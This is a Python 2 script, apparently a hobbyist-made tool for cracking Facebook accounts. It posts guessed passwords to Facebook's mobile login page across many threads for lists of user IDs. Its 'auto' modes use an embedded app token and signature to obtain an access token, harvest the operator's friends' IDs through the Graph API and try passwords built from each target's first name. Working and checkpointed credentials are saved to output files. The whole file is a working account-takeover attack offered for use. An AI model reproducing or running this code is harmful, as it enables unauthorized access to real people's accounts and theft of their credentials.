#-*-coding:utf-8-*-
# Coded By Deray
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

'''
 Rebuild Copyright Can't make u real programmer:)
'''

import os
import re
import sys
import bs4,json
import requests
import threading
from data.color import *
from data import cache
from multiprocessing.pool import  ThreadPool
cache.cleanCache()

cp=[]
fo=[]
fp=0
ps=""
sb=""
lp=""
initz = 0
_found = []
_cekpoin = []
threads = []
url="https://mbasic.facebook.com/login"
filez=""

def ngontol():
	if os.path.exists("out"):
		if os.path.exists("out/checkpoint.txt"):
			if os.path.getsize("out/checkpoint.txt") !=0:
				cek=raw_input('%s[!]%s file exists: out/%scheckpoint.txt%s\n%s[?]%s replace? y/n): '%(R,N,B,N,R,N)).lower()
				if cek == "y":
					open("out/checkpoint.txt","w").close()
			else:open("out/checkpoint.txt","w").close()
	else:
		os.mkdir("out")
		open("out/checkpoint.txt","w").close()
	if os.path.exists("out"):
		if os.path.exists("out/multiresult.txt"):
			if os.path.getsize("out/multiresult.txt") !=0:
				cek=raw_input('%s[!]%s file exists: out/%smultiresult.txt%s\n%s[?]%s replace? y/n): '%(R,N,B,N,R,N)).lower()
				if cek == "y":
					open("out/multiresult.txt","w").close()
		else:
			filez=open("out/multiresult.txt","w").close()
	else:
		os.mkdir("out")
		filez=open("out/multiresult.txt","w").close()
	
class asuBrute(threading.Thread):
	def __init__(self,*args):
		threading.Thread.__init__(self)
		self._urls = args[0]
		self._email = args[1]
		self._pasw = args[2]
		self._many = args[3]
		self._submit=args[4]
		
	def run(self):
		global initz,_found,_cekpoin
		initz+=1
		try:
			self._req=requests.post(self._urls,
				data={
							"email":self._email,
							"pass":self._pasw,
							"login":self._submit
						},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
			).url
			if "save-device" in self._req or "m_sess" in self._req:
				print "\r[+] Found     : %s -> %s"%(self._email,
				self._pasw)
				_found.append(" | %s -> %s"%(self._email,
				self._pasw))
				open("out/multiresult.txt","a").write(
					"%s|%s\n"%(self._email,self._pasw))
			if "checkpoint" in self._req:
				_cekpoin.append(" - %s - %s"%(self._email,
				self._pasw))
				open("out/checkpoint.txt","a").write("%s|%s\n"%(self._email,self._pasw))
			print "\r[%s*%s] Cracking %s/%s"%(G,N,initz,
			self._many),;sys.stdout.flush()
			
		except:pass

class _prepares:
	def __init__(self):
		ngontol()
		self._url = "https://mbasic.facebook.com/login"
		try:
			self.__wordlist()
		except Exception as __errors__:
			print("\r%s[!]%s %s"%(R,N,__errors__))
	
	def __wordlist(self):
		self._words=raw_input("\r[%s*%s] List ID: "%(C,N))
		if (self._words == ""):
			return self.__wordlist()
		try:
			self._openFile()
		except Exception as __errors__:
			print("\r%s[!]%s %s"%(R,N,__errors__))
			return self.__wordlist()
			
	def _generarePasswd(self):
		self._passwords = raw_input("\r[%s*%s] Password to crack: "%(R,N))
		if (self._passwords == ""):
			return self._generarePasswd()
		self._run()
		
	def _openFile(self):
		self.Files = open(self._words).read().splitlines()
		print "[%s*%s] Result account found saved to out/multiresult.txt"%(G,N)
		self._generarePasswd()

	def _run(self):
		global threads,_found
		tred=0
		self._regeg = bs4.BeautifulSoup(
			requests.get(self._url).text,
		features="html.parser")
		for _findSubmit in self._regeg("input"):
			if "login" in _findSubmit["name"]:
				self._submit = _findSubmit["value"]
				break
		toket=[]
		for _run_ in self.Files:
			toket.append(_run_)
		for _run_ in toket:
			_t=asuBrute(self._url,_run_,self._passwords,
			len(self.Files),self._submit)
			threads.append(_t)
			
		for _t in threads:
			_t.start()
			
		for _t in threads:
			_t.join()

		
			
		if (len(_found) !=0):
			print("\n%s[*]%s Found %s"%(G,N,len(_found)))
			for x in _found:
				print x
			print("%s[*]%s output: out/multiresult.txt"%(G,N))
			exit()
				
		else:
			print("\n%s[-] %sno result found :')"%(R,N))
		if (len(_cekpoin) !=0):
			print("\n%sCheckpoint %s"%(warn,len(_cekpoin)))
			for _ngentot in _cekpoin:
				print("%s%s%s"%(O,_ngentot,N))
			print("%s[*]%s output: out/checkpoint.txt"%(G,N))
			sys.exit()
				
				


class thread:
	def __init__(self,id):
		global cp,fo,fp,url,ps,sb,lp
		try:
			r=requests.post(
				url,data=
					{
						"email":id.replace("\n",""),
						"pass":ps,
						"login":sb
					},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
			).url
			if "save-device" in r or "m_sess" in r:
				fo.append("%s|%s"%(id,ps))
				open("out/multiresult.txt","a").write("%s|%s\n"%(id.replace("\n",""),ps))
			if "checkpoint" in r:
				cp.append("%s|%s"%(id,ps))
				open("out/checkpoint.txt","a").write("%s|%s\n"%(id.replace("\n",""),ps))
			else:
				fp+=1
				print "\r[%s] cracking %s/%s: found:-%s%s%s   "%(len(cp),fp,len(lp),G,len(fo),N),;sys.stdout.flush()
		except:pass
				

class prepare:
	def __init__(self):
		ngontol()
		self.tg()
		
	def tg(self):
		global url,ps,sb,lp
		try:
			file=raw_input("[%s+%s] File ID: "%(G,N))
			self.fail=open(file).readlines()
			lp=self.fail
			bs=bs4.BeautifulSoup(
				requests.get(url).text,
			features="html.parser")
			for x in bs("input"):
				if "login" in x["name"]:
					sb=x["value"]
			ps=raw_input("[%s#%s] Password to crack: "%(G,N))
		except Exception as f:
			print("%s[!]%s %s"%(R,N,f))
			return self.tg()
		self.pol(self.fail)
	
	def cek(self):
		global cp,fo,fp,ps,sb,lp
		if len(fo) !=0:
			print "%s[!]%s found: %s"%(G,N,len(fo))
			for x in fo:
				print "[%s+%s] %s"%(G,N,x.replace("\n",""))
			print("%s[*]%s output: out/multiresult.txt"%(G,N))
			exit()
		else:exit("%s[:(]%s no result found."%(R,N))
		if len(cp) !=0:
			print "\n%s[-]%s checkpoint: %s"%(O,N,len(cp))
			for x in cp:
				print "[%s-%s] %s"%(O,N,x.replace("\n",""))
			print("%s[*]%s output: out/checkpoint.txt"%(G,N))
			sys.exit()
					
	def pol(self,list):
		global cp,fo
		try:
			self.list=list
			self.p=ThreadPool(input("[%s*%s] Enter Threads: "%(G,N)))
		except:
			print("%s[!]%s init is required."%(R,N))
			return self.pol(self.list)
		try:
			self.p.map(thread,self.list)
			print("\n[%s*%s] finished."%(G,N))
			self.cek()
		except:
			print "\n%s[!]%s something error"%(R,N)
			self.cek()

class embeep:
	def __init__(self):
		self.i="https://mbasic.facebook.com/{}"
		self.kontol=0
		self.found=[]
		self.cp=[]
		ngontol()
		self.priper()
		
	def priper(self):
		try:
			self.file=open(raw_input(
				"[%s+%s] File ID: "%(G,N))).read().splitlines()
		except Exception as __errors__:
			print("%s[!]%s %s"%(R,N,__errors__))
			return self.priper()
		print("%s[*]%s use coma (,) for another passwords,ex: pass123,pass321"%(C,N))
		self.ps()
		
	def ps(self):
		self.s=raw_input("[%s#%s] Password to crack: "%(G,N)).split(",")
		if self.s =="":
			return self.ps()
		self.pool()
		
	def pool(self):
		try:
			self.p=ThreadPool(input("[%s*%s] Enter Threads: "%(G,N)))
		except:
			print("%s[!]%s init is required."%(R,N))
			return self.pool()
		self.p.map(self.crack,self.file)
		self.cek()
		
	def cek(self):
		if len(self.found) !=0:
			print "\n\n%s[+]%s found: %s"%(G,N,len(self.found))
			for x in self.found:
				print x
			print "%s[+]%s output: out/multiresult.txt\n\n"%(C,N)
		if len(self.cp) !=0:
			print("\n\n%s[-]%s checkpoint: %s"%(O,N,len(self.cp)))
			for x in self.cp:
				print x
			print "%s[-]%s output: out/checkpoint.txt"%(R,N)
		if len(self.cp) ==0 and len(self.found) ==0:
			print("\n%s[:(]%s no result found."%(R,N))
			
	def crack(self,file):
		for x in self.s:
			try:
				self.r=requests.post(self.i.format("login"),
					data={
						"email":file,
						"pass":x
					},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
				).url
				if "save-device" in self.r or "m_sess" in self.r:
					self.found.append("%s[!]%s %s|%s"%(
						G,N,file,x))
					open("out/multiresult.txt","a").write(
						"%s|%s\n"%(file,x))
				if "checkpoint" in self.r:
					self.cp.append("%s[-]%s %s|%s"%(
						O,N,file,x))
					open("out/checkpoint.txt","a").write(
						"%s|%s\n"%(file,x))
				print "\r[%s] cracking %s/%s: found:-%s%s%s   "%(len(self.cp),self.kontol,len(self.file),G,len(self.found),N),;sys.stdout.flush()
			except:
				pass
		self.kontol+=1
		
		

class autoBrute:
	def __init__(self):
		ngontol()
		self.loop=0
		self.target=[]
		self.found=[]
		self.cp=[]
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://mbasic.facebook.com/{}"
		self.a="https://graph.facebook.com/{}"
		self.gen()
		
	def gen(self):
		self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(self.config["email"],self.config["pass"])).json()
		try:
			self.token=self.r["access_token"]
		except:
			exit("%s[!]%s failed when generate access token."%(R,N))
		print("%s[*]%s grabbing id ..."%(G,N))
		for x in requests.get(self.a.format(
			"me/friends?access_token=%s"%(
				self.token))).json()["data"]:
			self.target.append(x["id"])
		p=ThreadPool(100)
		p.map(self.k,self.target)
		self.panggil()
		
	def panggil(self):
		if len(self.found) !=0:
			print("\n\n%s[*]%s found: %s"%(G,N,len(
				self.found)))
			for x in self.found:
				print("%s[*]%s %s"%(G,N,x))
			print("\n%s[*]%s output: out/multiresult.txt"%(
				G,N))
		if len(self.cp) !=0:
			print("\n\n%s[*]%s checkpoint: %s"%(G,N,len(
				self.cp)))
			for x in self.cp:
				print("%s[*]%s %s"%(G,N,x))
			print("\n%s[*]%s output: out/checkpoint.txt"%(
				G,N))
		if len(self.found) ==0 and len(self.cp) ==0:
			print("\n%s[:(]%s no result found."%(R,N))
		
	def k(self,target):
		self.user=requests.get(self.a.format(
			target+"?access_token=%s"%(
		self.token))).json()["first_name"]
		for x in [self.user+"123",self.user+"12345"]:
			r=requests.post(self.i.format("login"),
				data=
					{
						"email":target,
						"pass":x
					},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
			).url
			if "save-device" in r or "m_sess" in r:
				open("out/multiresult.txt","a").write(
					"%s|%s\n"%(target,x))
				self.found.append("%s|%s"%(target,x))
				break
			if "checkpoint" in r or "challange" in r:
				self.cp.append("%s|%s"%(target,x))
				open("out/checkpoint.txt","a").write(
					"%s|%s\n"%(target,x))
				break
		self.loop+=1
		print("\r[%s] Cracking %s/%s found-:%s%s%s    "%(
			len(self.cp),self.loop,len(self.target),
				G,len(self.found),N)),;sys.stdout.flush()
				

class autoburut(object):
	def __init__(self):
		ngontol()
		self.target=[]
		self.found=[]
		self.count=0
		self.checkpoint=[]
		self.i="https://mbasic.facebook.com/{}"
		self.k="https://graph.facebook.com/{}"
		self.req=requests.Session()
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.lki()
	def panggil(self):
		if len(self.found) !=0:
			print("\n\n%s[*]%s found: %s"%(G,N,len(
				self.found)))
			for x in self.found:
				print("%s[*]%s %s"%(G,N,x))
			print("\n%s[*]%s output: out/multiresult.txt"%(
				G,N))
		if len(self.checkpoint) !=0:
			print("\n\n%s[*]%s checkpoint: %s"%(G,N,len(
				self.checkpoint)))
			for x in self.checkpoint:
				print("%s[*]%s %s"%(G,N,x))
			print("\n%s[*]%s output: out/checkpoint.txt"%(
				G,N))
		if len(self.found) ==0 and len(self.checkpoint) ==0:
			print("\n%s[:(]%s no result found."%(R,N))
			
	def lki(self):
		print("[*] Login...")
		s=self.req.post(self.i.format("login"),
			data={
				"email":self.config["email"],
				"pass":self.config["pass"]}
		).url
		if "save-device" in s or "m_sess" in s:
			self.api()
		else:exit("%s[!]%s Login failed."%(R,N))
		
	def api(self):
		try:
			self.token=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(self.config["email"],self.config["pass"])).json()["access_token"]
		except:
			exit("login fail")
		self.login()
		
	def login(self):
		try:
			self.list=open(
				raw_input("%s[?]%s ID List: "%(
			G,N))).read().splitlines()
		except Exception as __error__:
			print("%s[!]%s %s"%(R,N,__error__))
			self.login()
		self.thread()
		
		
	def thread(self):
		try:
			self.thr=input("%s[?]%s Thread: "%(G,N))
			if self.thr > 100:
				print "%s[!]%s max thread 100"%(R,N)
				self.thread()
		except Exception as e:
			print("%s[!]%s %s"%(R,N,e))
			self.thread()
		print("%s[*]%s mapping list..."%(G,N))
		ThreadPool(self.thr).map(self.parseName,self.list)
		self.panggil()
	def parseName(self,id):
		try:
			s=self.req.get("https://graph.facebook.com/%s?access_token=%s"%(id,self.token)).json()
			if " " in s["first_name"]:
					self.crack(id,s["first_name"].split(" ")[0])
			else:
				try:
					self.crack(id,s["first_name"])
				except:pass
		except:pass
				
	def crack(self,id,nama):
		lists=[
			"%s123"%(nama.lower()),"%s12345"%(nama.lower()),
				"%sganteng"%(nama.lower()),
			"%scantik"%(nama.lower()),"kontol","anjing","bangsat"
		]
		for x in lists:
			try:
				s=requests.post(self.i.format("login"),
					data={
						"email":id,
						"pass":x
					},headers={
				"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"},timeout=6).url
				if "save-device" in s or "m_sess" in s:
					if x in open("out/multiresult.txt").read():
						break
					else:
						self.found.append("%s|%s"%(id,x))
						open("out/multiresult.txt","a").write("%s|%s\n"%(id,x))
						break
				if "checkpoint" in s:
					if x in open("out/multiresult.txt").read():
						break
					else:
						self.checkpoint.append("%s|%s"%(id,x))
						open("out/checkpoint.txt","a").write("%s|%s\n"%(id,x))
						break
			except:
				continue
		self.count+=1
		print "\r[%s] cracking %s/%s: found:-%s%s%s   "%(
			len(self.checkpoint),
				self.count,len(self.list),
		G,len(self.found),N),;sys.stdout.flush()		
